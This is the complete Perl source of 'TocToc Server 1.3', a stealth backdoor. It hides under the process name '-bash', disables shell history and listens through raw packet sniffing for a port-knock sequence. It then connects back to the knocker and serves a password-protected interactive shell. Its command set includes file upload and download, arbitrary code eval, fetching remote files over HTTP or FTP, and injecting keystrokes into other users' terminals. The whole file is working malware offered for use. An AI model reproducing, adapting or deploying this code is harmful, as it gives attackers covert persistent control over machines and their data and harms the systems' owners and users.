   #!/usr/bin/perl
   # TocToc Server 1.3
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrixteam.net
   #
   #
   ######### CONFIGURATION ###########
   my $proc_name='-bash';            # process name
   my $pdev="";                      ## extern interface - if none
                                     ## especifyed it will be looked up
   my $pass = 'CRYPTED';             # Crypted password
   my $bdp= $ARGV[0] || 6767;        # BackDoor port
   my $home = "/";                   # HOME directory
   my $shell = "/bin/bash";          # Shell location
   my @commands = (                  ## Commands to be executed
   'cat /etc/issue.net 2> /dev/null',## before run $shell
   'id',                             ## you can also use ';' to
   'uname -a'                        ## separate them:
   );                                ## my @commands = ('id;uname -a');
   my @bashrc = (                    # The bashrc lines gonna be written
     'alias ls=\'ls $LS_OPTIONS\''   # in "$home/.bashrc before a shell
   );                                # be spawned and deleted after it
   ###################################

   ####################################
   # You can change the ENV stuff too #
   ####################################

   #### ENVironment ####
   $ENV{HOME}       = $home;
   $ENV{PS1}        = '[\u@\h \W]: '; # the way i like :)
   $ENV{MAIL}       = '/var/mail/root';
   $ENV{HISTFILE}   = '/dev/null';
   $ENV{USER}       = 'root';
   $ENV{LOGNAME}    = 'root';
   $ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';
   $ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';
   $ENV{SHELL}      = $shell;
   $ENV{TERM}       = 'xterm';
   #####################

   ########################################
   # Probably you don´t wanna change that #
   ########################################

   # DO NOT ADD SIG{INT} HERE
   ###### SIGnals ######
   $SIG{HUP}  = 'IGNORE';
   $SIG{TERM} = 'IGNORE';
   $SIG{CHLD} = sub { wait; };
   #####################

   ####################################
   ### Don´t make any change unless ###
   ### you know what your are doing ###
   ####################################
   my $buffer = 4096;

   $0=$proc_name."\0"x16;
   my $pid=fork;
   exit if $pid;
   chdir("/");

   # Modules needed #
   use Net::RawIP;
   use IO::Socket;
   use IO::Pty;
   use IO::Handle;
   use IO::Stty;
   use IO::Socket;
   use IO::Select;
   use Term::ReadKey;
   use LWP::UserAgent;
   use Cwd;
   ##################

   # to use ioctl
   eval {
     require 'ioctl.ph';
     require 'sys/ioctl.ph';
     require 'asm/ioctls.ph';
   };

   use strict;

   my $VERSION = "1.3";

   my $bdp1 = $bdp-1;
   my $bdp2 = $bdp+1;
   my $psize = 1024;
   my $ptout = 64;
   my $ip = 20;
   my (%c_ipt, @p, %pd);

   $pdev=Net::RawIP::lookupdev($ptout) unless $pdev;
   my $ifs = ifaddrlist;
   my $LIP = $ifs->{$pdev};
   my $pfil = "tcp and ( dst host $LIP )";

   my $c=0;
   my $p=new Net::RawIP({ip=>{},tcp=>{}});
   my $psck=$p->pcapinit($pdev,$pfil,$psize,$ptout);
   my $offset=Net::RawIP::linkoffset($psck);
   die "Erro: Link offset not supported!\n" if (!$offset);


   pipe(CHILD_RDR, PARENT_WTR);

   my $pid = fork();
   die "Could not fork()" if (not defined($pid));

   unless ($pid) {
     chdir("$home");

     close(PARENT_WTR);

     CHILD_RDR->autoflush(1);
     my $rdr = new IO::Handle;
     $rdr->fdopen(fileno(CHILD_RDR), 'r');
     $rdr->blocking(0);

     my %SHELL;
     my %CLIENT;
     my $connections = 0;

     my $sel_serv = IO::Select->new();
     my $sel_shell = IO::Select->new();

     my $rdr_buf = '';
     while ( 1 ) {
       sleep(2) if ($connections == 0); # dont wast cpu when not needed

       if (defined(my $n = $rdr->sysread($rdr_buf, 4096))) {
         rdr_parse("$rdr_buf");
         $rdr_buf = '';
       }

       my @ready = $sel_serv->can_read(0);
       foreach my $fh (@ready) {
         my $msg;
         my $nread = sysread($fh, $msg, 4096);

         if ($nread == 0) {
           close_client($fh);
         } elsif (not defined($CLIENT{$fh}{senha})) {
             my $m = $msg;
             $m =~ s/\n$//;
             if (crypt($m, $pass) eq $pass) {
               $CLIENT{$fh}{senha} = 1;
               write_client($fh, "\002\001\002\n");
               $fh->autoflush(1);
               new_shell($fh);
             } else {
                 finish_client($fh, "\001\002\001\003\n");
             }
         } elsif (defined($CLIENT{$fh}{senha}) and $CLIENT{$fh}{senha} == 1) {
             parse_msg($fh, $msg);
         }
       }
       my @shell_ready = $sel_shell->can_read(0);
       foreach my $shell (@shell_ready) {
         read_shell($shell);
       }
     }

   ##############
   # CHILD SUBS #
   ##############
     sub rdr_parse {
       my $msg = shift;
       my @lines = split(/\n/, $msg);
       foreach my $line (@lines) {
         if ($line =~ /^CONN (.*)/) {
           open_conn(split(':',$1));
         }
       }
     }
     sub open_conn {
       my ($ip, $port) = @_;
       my $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=> $ip, PeerPort=>$port, Timeout => 7) || return(undef);
       $connections++;
       $sel_serv->add($sock);
       write_client($sock, "\001\002\001\n");
     }

     sub read_shell {
       my $shell = shift;
       my $cli;

       my $msg = '';
       foreach my $s (keys(%SHELL)) {
         if ($SHELL{$s} eq $shell) {
           $cli = $s;
           last;
         }
       }

       my $read = sysread($shell, $msg, $buffer);

       if ($read == 0) {
         finish_client($cli, "Terminal closed.\n");
         $shell->close;
         $sel_shell->remove($shell);
       } else {
          write_client($cli, $msg);
       }
     }

     sub gr_sock {
       my $cli = shift;
       foreach my $s ($sel_serv->can_write(1)) {
         return($s) if ($s eq $cli);
       }
       return(undef);
     }

     sub gr_shell {
       my $shell = shift;
       foreach my $s ($sel_shell->can_write(1)) {
         return($s) if ($s eq $shell);
       }
       return(undef);
     }

     sub new_shell {
       my $cli = shift;
       my $pty = new IO::Pty;

       my $bashrc_file = "$home/.bashrc";
       $bashrc_file =~ s/^\/\//\//;

       unless ($pty) {
         finish_client($cli, "ERRO: There is no PTY´s devices available.\n");
       }

       my $pid = fork();
       $CLIENT{$cli}{SHELL_PID} = $pid;

       if (not defined($pid)) {
         finish_client($cli, "ERRO: fork()\n");
       }


       unless ($pid) {

         $pty->make_slave_controlling_terminal();
         my $slave = $pty->slave();
         close $pty;

         $slave->set_raw();
         unless (open(STDIN,"<&". $slave->fileno())) {
           finish_client($cli,"Couldn't reopen STDIN for reading.\n");
           exit;
         }
         unless (open(STDOUT,">&". $slave->fileno())) {
            finish_client($cli, "Couldn't reopen STDOUT for writing.\n");
            exit;
         }
         unless (open(STDERR,">&". $slave->fileno())) {
           finish_client($cli, "Couldn't reopen STDERR for writing.\n");
           exit;
         }

         STDOUT->autoflush(1);
         STDIN->autoflush(1);
         STDERR->autoflush(1);

         close $slave;

         ReadMode 0;
         sleep 1;
         IO::Stty::stty(\*STDIN,"sane");

         chdir("$home");

         my $command = join(';', @commands);
         if (defined($command)) {
           system("$command &"); # '&' to execute it in backgroud
           sleep(1); # to get the commands answer
                     # i hope 1 sec is enougth
         }

         # writing out .bashrc
         open(BRC, "> $bashrc_file");
         print BRC join("\n", @bashrc);

         { exec("$shell") };

         syswrite(STDOUT, "ERRO: exec($shell)\n");
         exit;
       }
       $pty->close_slave();
       $pty->set_raw();
       $SHELL{$cli} = $pty;
       $sel_shell->add($pty);

     }

     sub parse_msg {
       my ($cli, $msg) = @_;
       if ($msg =~ /\001T:(.+?)\s(.*):\002\n/) {
         while ($msg =~ m/\001T:(.+?)\s(.*):\002\n/g) {
           my $cmd  = $1;
           my $arg  = $2;
           my @args = split(/ +/, $arg);
           if ($arg eq "ABORT") {
             if ($cmd eq "DOWNLOAD") {
               my $pipe = $CLIENT{$cli}{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}{DOWNLOAD_PIPE}));
               if (defined($pipe)) {
                  print $pipe "ABORT\n";
                  close($pipe);
                  delete($CLIENT{$cli}{DOWNLOAD_PIPE});
               }
             }
             next;
           }
           if ($cmd eq "TERM_SIZE") {
             my $shell = gr_shell($SHELL{$cli});
             return() unless (scalar(@args) == 4);
             SetTerminalSize(@args, $shell);
             if (defined($CLIENT{$cli}{termsize})) {
               write_client($cli, "\nTerminal size has changed.\n\n");
             } else {
                 $CLIENT{$cli}{termsize} = 1;
             }
           } elsif ($cmd eq "HIJACK") {
               my $chars = join(" ", @args[1 .. $#args]);
               hijack($cli, $args[0], $chars);
           } elsif ($cmd eq "GET") {
               sendfile($cli, @args);
           } elsif ($cmd eq "PUT") {
               getfile($cli, @args);
           } elsif ($cmd eq "EVAL") {
               my $ret = eval "$arg";
               spm_done($cli, $cmd, "Evaluation returned: $ret");
           } elsif ($cmd eq "SOCKLIST") {
               socklist($cli, "$arg");
               spm_done($cli, $cmd);
           } elsif ($cmd eq "PROXY") {
               proxy($cli, @args);
           } elsif ($cmd eq "PWD") {
               my $dir = getcwd();
               spm_done($cli, $cmd, "$dir");
           } elsif ($cmd eq "LAG") {
               spm_done($cli, $cmd, $arg);
           } elsif ($cmd eq "CD") {
               if (chdir("$arg")) {
                 my $dir = getcwd();
                 spm($cli, $cmd, "Changed directory to: $dir");
               } else {
                  spm($cli, $cmd, "I could not change directory to: $arg");
               }
               spm_done($cli, $cmd);
           } elsif ($cmd eq "DOWNLOAD") {
               my ($url, $file) = @args;
               my $pwd = getcwd();
               unless(defined($file)) {
                 $file = $url;
                 $file =~ s/^.*\/(\S+)$/$1/;
               }
               $file = "$pwd/$file";
               $file =~ s/^\/\//\//;

               unless(open(FILE, "> $file")) {
                 spm_done($cli, $cmd, "Error: Cannot creat $file");
                 next;
               }

               close(FILE);
               unless(download($cli, $url, $file))  {
                 spm_done($cli, $cmd, "Error: I could not fork() the process.");
                 next;
               }
           } elsif ($cmd eq "PS") {
               my @ps = ps();
               if (scalar(@ps) == 0) {
                 spm_done($cli, $cmd, "None hidden procces has been found.");
               } else {
                  foreach my $ps (@ps) {
                    spm($cli, $cmd, "$ps");
                  }
                  spm_done($cli, $cmd);
               }
           } else {
              spm_done($cli, $cmd, "Error: Command not implemented in this version ($VERSION).");
           }

         }
       } else {
          write_shell($cli, $msg);
       }
     }

     sub spm_done {
        my ($cli, $cmd, $msg) = @_;
        if (defined($msg)) {
          spm($cli, $cmd, $msg);
        }
        spm($cli, $cmd, "DONE");
     }

     sub spm {
       my ($cli, $cmd, $ans) = @_;
       write_client($cli, "\001T:$cmd $ans:\002\n");
     }

     sub ps {
       opendir(DIR, "/proc");
       my @proc= readdir(DIR);
       close DIR;
       my @ps=`ps ax`;
       my ($p, $c, $cmd, @retr);
       for(@proc) {
         $p = $_;
         if (/^\d+/) {
           $c=0;
           for (@ps) {
             /(\d+)\s+/;
             if ($p == $1) { $c=1; }
           }
           if ($c == 0) {
             open(PID, "/proc/$p/cmdline");
             $cmd =<PID>;
             close PID;
             $cmd =~ s/\0/ /g;
             $cmd =~ s/^(.*)\s+$/$1/;
             push (@retr, "PID: $p ($cmd)");
           }
         }
       }
       return (@retr);
     }

     sub hijack {
       my ($cli, $device, $msg) = @_;
       unless(open(TTY, "+>$device")) {
         spm_done($cli, "HIJACK", "I could not open tty $device");
         return();
       }

       # i hope it works
       unless (defined(&TIOCSTI)) {
         spm($cli, "HIJACK", "WARNING: Trying to define &TIOCSTI, propably 'sys/ioctl.ph' wasn't loaded. Its not recommended to go on, type 'close' or type the last command again ($msg).");
         eval 'sub TIOCSTI () {0x5412;}';
         spm_done($cli, "HIJACK");
       }

       $msg .= "\n";

       foreach my $char (split('', $msg)) {
         spm($cli, "HIJACK", "Hey yo! I couldn't write on $device: $!")
         unless (ioctl(TTY, &TIOCSTI, $char));
       }
       close(TTY);
       spm_done($cli, "HIJACK");
     }

     sub getfile {
        my ($cli, $file, $port) = @_;
        $cli = gr_sock($cli);
        my $pid = fork();
        return(undef) if (not defined($pid));
        unless ($pid) {
          my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => 'tcp', Timeout=> 10);
          exit unless($transfer);
          $transfer->autoflush(1);

          my $OK = 1;
          if (-e "$file") {
            syswrite($transfer, "File already exists.", 20);
            $OK = 0;
          }
          unless (open(FILE, "> $file")) {
            syswrite($transfer, "I could not open the file.", 26);
            $OK = 0;
          }

          syswrite($transfer, "OK", 2) if ($OK == 1);

          my $msg;
          my $got_info = 0;
          my $bytes = 0;

          while ( 1 ) {
             my $ready = sysread($transfer, $msg, $buffer);
             if ($ready == 0) {
                close(FILE);
                exit;
             }
             if ($got_info == 0) {
               $got_info = 1;
               syswrite($transfer, '0', 1);
               next;
             }
             print FILE $msg;
             $bytes += length($msg);
             syswrite($transfer, $bytes, length($bytes));
          }

          exit;
        }
     }


     sub sendfile {
        my ($cli, $file, $port) = @_;
        $cli = gr_sock($cli);
        my $pid = fork();
        return(undef) if (not defined($pid));
        unless ($pid) {
          my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => 'tcp', Timeout=> 10);
          exit unless($transfer);
          $transfer->autoflush(1);

          unless (-e "$file") {
             syswrite($transfer, "File not found.", 15);
          }
          unless (open(FILE, "< $file")) {
            syswrite($transfer, "I could not open the file.", 26);
          }


          my $bytes = (stat("$file"))[7];
          syswrite($transfer, $bytes, length($bytes));

          my $msg;

          while ( 1 ) {
             my $ready = sysread($transfer, $msg, $buffer);
             if ($ready == 0) {
               close(FILE);
               exit;
             }
             seek(FILE, $msg, 0);
             my $send_bytes;
             read(FILE, $send_bytes, $buffer);
             syswrite($transfer, $send_bytes, length($send_bytes));
          }

          exit;
        }
     }

     # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997
     # adapted for TocToc use
     sub socklist {
       my ($cli, $proto) = @_;
       undef($proto) if ($proto eq "0" );

       our $init = 0;

       my %sock_proc;
       opendir (PROC, "/proc") || spm($cli, "SOCKLIST", "Error: Could not open /proc");
       for my $f (readdir(PROC)) {
           next if (! ($f=~/[0-9]+/) );
           if (! opendir (PORTS, "/proc/$f/fd")) {
               closedir PORTS;
               next;
           }
           for my $g (readdir(PORTS)) {
               next if (! ($g=~/[0-9]+/) );
               my $r=readlink("/proc/$f/fd/$g");

               my ($dev,$ino)=($r=~/^(socket|\[[0-9a-fA-F]*\]):\[?([0-9]*)\]?$/);

               if ($dev == "[0000]" || $dev == "socket") {$sock_proc{$ino}=$f.":".$g;}    }
           closedir PORTS;
       }
       closedir PROC;

       sub scheck {
         open(FILE,"/proc/net/".$_[0]) || spm($cli, "SOCKLIST", "Error: Could not open file /proc/net/".$_[0]." for reading.");
         while (<FILE>) {
             my @F=split();
             next if ($F[9]=~/uid/);
             my @A=split(":",$F[1]);
             my $a=hex($A[1]);
             my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);
             my $cmd = "";
             if ($pid && open (CMD,"/proc/$pid/status")) {
                my $l = <CMD>;
                ($cmd) = ( $l=~/Name:\s*(\S+)/ );
                close(CMD);
             }
             if ($init == 0 ) {
                 spm($cli, "SOCKLIST", "type  port      inode     uid    pid   fd  name");
                 $init = 1;
             }
             my $string = sprintf("%s %6d %10d  %6d %6d %4d  %s", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);
             spm($cli, "SOCKLIST", $string);
         }
         close(FILE);
       }
       if (not defined($proto)) {
         scheck("tcp");
         scheck("udp");
         scheck("raw");
       } elsif (grep { $_ eq $proto } ("tcp", "udp", "raw")) {
           scheck("$proto");
       } else {
          spm($cli, "SOCKLIST", "Error: protocol ".uc($proto)." not found in the list (UDP, TCP, RAW)");
       }

     }

     sub download {
       my ($cli, $link, $file) = @_;

       pipe(RDR, WTR);
       WTR->autoflush(1);
       RDR->autoflush(1);

       $CLIENT{$cli}{DOWNLOAD_PIPE} = \*WTR;

       my $pid = fork();
       return(undef) if not defined($pid);

       unless($pid) {
         close(WTR);
         unless(open(FILE, "> $file")) {
           spm_done($cli, "DOWNLOAD", "I could not open $file for writting");
           exit;
         }

         my $first = 1;

         my $init_time;
         my $saved_data = 0;
         if ($link =~ /^http/i) {
           my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );
           my $req = new HTTP::Request GET => $link;

           my $res = $ua->request($req,\&http_save_data, 4096);
           $init_time = time;
           if ($res->header("X-Died") || !$res->is_success) {
             spm($cli, "DOWNLOAD", "Error: Download was interrupted by peer");
           } else {
              spm($cli, "DOWNLOAD", "Download finished, file $file has been saved.");
           }
         } elsif ($link =~ /^ftp/i) {
             $link =~ s/^ftp:\/\///;
             $link =~ /(.+?)\/(.*)/;
             my $host = $1;
             my $file = $2;
             my $save = $link;
             $save =~ s/.*\/(.+?)$/$1/;

             unless ($host or $file) {
               spm_done($cli, "DOWNLOAD", "Unrecognized ftp link");
               exit;
             }
             my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => 21, Proto => "tcp", Timeout => 15);
             unless ($sock) {
               spm_done($cli, "DOWNLOAD", "Error: I could not connect on host ($host:21)");
               exit;
             }

             my $logado = 0;
             print $sock "USER anonymous\nPASS anonymous\@anonymous.com\n";
             my ($size, $trans);

             while (<$sock>) {
                my $buf = $_;
                $buf =~ s/\n//;
                if ($buf =~ /^230/ and $logado == 0) {
                  $logado = 1;

                  print $sock "TYPE I\nPASV\nRETR $file\n";
                } elsif ($buf =~ /^150.+?\((\d+)\s.+?\)/) {
                   $size = $1;
                   $init_time = time;
                   my $saved_data = 0;
                   open(FILE, "> $save");
                   while (<$trans>) {
                     print FILE $_;
                     $saved_data += length($_);
                     gotta_die();
                     if ($first == 1) {
                       spm($cli, "DOWNLOAD", "Status: Downloading $link ($size size). Type ^C to abort");
                       $first = 0;
                     } else {
                        spm($cli, "DOWNLOAD", "$init_time $saved_data $size");
                     }
                   }
                   close(FILE);
                   print $sock "QUIT\n";
                   last;
                } elsif ($buf =~ /^530/ and $logado == 1) {
                    spm_done($cli, "DOWNLOAD", "Error: File not found.");
                    exit;
                } elsif ($buf =~ /^227.+?\((.*)\)/) {
                    my @info = split(',', $1);
                    my $host = join('.', @info[0 .. 3]);
                    my $port = $info[4] * 256 + $info[5];
                    $trans = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "$port", Proto => "tcp");
                    unless ($trans) {
                      spm_done($cli, "DOWNLOAD", "Error: I could not estabilish the transfer connection\n");
                      exit;
                    }
                }
             }
         }

         spm_done($cli, "DOWNLOAD");
         sleep(1);
         exit;

         sub http_save_data {
           my($data, $response, $protocol) = @_;
           print FILE $data;
           gotta_die();
           $saved_data += length($data);
           my $total_data = $response->content_length;

           if ($first == 1) {
             spm($cli, "DOWNLOAD", "Status: Downloading $link ($total_data size). Type ^C to abort");
             $first = 0;
           } else {
               spm($cli, "DOWNLOAD", "$init_time $saved_data $total_data");
           }

         }
         sub gotta_die {
           my $readfields = '';
           vec($readfields, fileno(RDR), 1) = 1;
           my $ready = select($readfields, undef, undef, 0);
           if ($ready == 1) {
             spm_done($cli, "DOWNLOAD", "Operetion aborted!");
             sleep(1);
             exit;
           }
         }
       }
       close(RDR);
       return(1);
     }


     sub write_shell {
       my ($cli, $msg) = @_;
       my $shell = gr_shell($SHELL{$cli});

       unlink("$home/.bashrc") if (-e "$home/.bashrc"); # here we check and delete
                                                        # the file
       return(syswrite($shell, $msg, length($msg)));
     }

     sub write_client {
        my ($cli, $msg) = @_;
        my $cli_sock = gr_sock($cli);
        return() if (not defined($cli_sock));
        syswrite($cli_sock, $msg, length($msg));
     }

     sub finish_client {
       my ($cli, $msg) = @_;
       write_client($cli, $msg);
       close_client($cli);
     }

     sub close_client {
       my $cli = gr_sock(shift);
       $sel_serv->remove($cli);
       if (defined($SHELL{$cli})) {
         my $shell = $SHELL{$cli};
         $sel_serv->remove($shell);
         close($shell);
         my $shell_pid = $CLIENT{$cli}{SHELL_PID};
         kill(9, $shell_pid) if ($shell_pid);
         delete($SHELL{$cli});
       }
       delete($CLIENT{$cli});
       $cli->close() if(defined($cli));
       $connections--;
     }

   } # END OF CHILD
   close(CHILD_RDR);

   while ( 1 ) {
     loop $psck,-1,\&parse,@p;
   }

   #############
   # MAIN SUBS #
   #############

   sub conecta {
   #  print "conectando no cliente...\n";
     my ($ip, $port) = @_;
     syswrite(PARENT_WTR, "CONN $ip:$port\n");
   }

   # The parse() have been ripped from RawSniff (v0.8) by David Hulton
   # and addapted

   sub parse {
     if ($c == 50) { $c=0; undef(%c_ipt) } # pra num gasta muita mem

     my $pckt=$_[2];

     my $flags=unpack("B8",substr($pckt,$offset+$ip+13,1));
     my $conck=substr($flags,6,1);
     my $disconck=substr($flags,7,1);

     my @saddr=unpack("CCCC",substr($pckt,$offset+12,4));

     $pd{'saddr'}=join('.',@saddr);
     $pd{'shost'}=$pd{'saddr'};
     my @daddr=unpack("CCCC",substr($pckt,$offset+16,4));
     $pd{'daddr'}=join('.',@daddr);
     $pd{'dhost'}=$pd{'daddr'};
     $pd{'sport'}=unpack("nn",substr($pckt,$offset+$ip,4));
     $pd{'dport'}=unpack("nn",substr($pckt,$offset+$ip+2,4));
     if ($conck) {
       $c++;
       $c_ipt{$c}{ip}   = $pd{'saddr'};
       $c_ipt{$c}{port} = $pd{'dport'};
       $c_ipt{$c}{'time'} = time;
     }
     foreach my $con (keys(%c_ipt)) {
       next if (not defined($c_ipt{$con+1}) or not defined($c_ipt{$con+2}));

       if ($c_ipt{$con}{port} == $bdp1 and
           $c_ipt{$con+1}{port} == $bdp2 and
           $c_ipt{$con}{ip} eq $c_ipt{$con+1}{ip} and
           $c_ipt{$con+2}{ip} eq $c_ipt{$con}{ip} and
           ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) > 1 and
           ($c_ipt{$con+1}{'time'}-$c_ipt{$con}{'time'}) < 10) {

           conecta($c_ipt{$con}{ip}, $c_ipt{$con+2}{port});
           undef(%c_ipt);
           $c=0;
           last;
       }
     }
   }
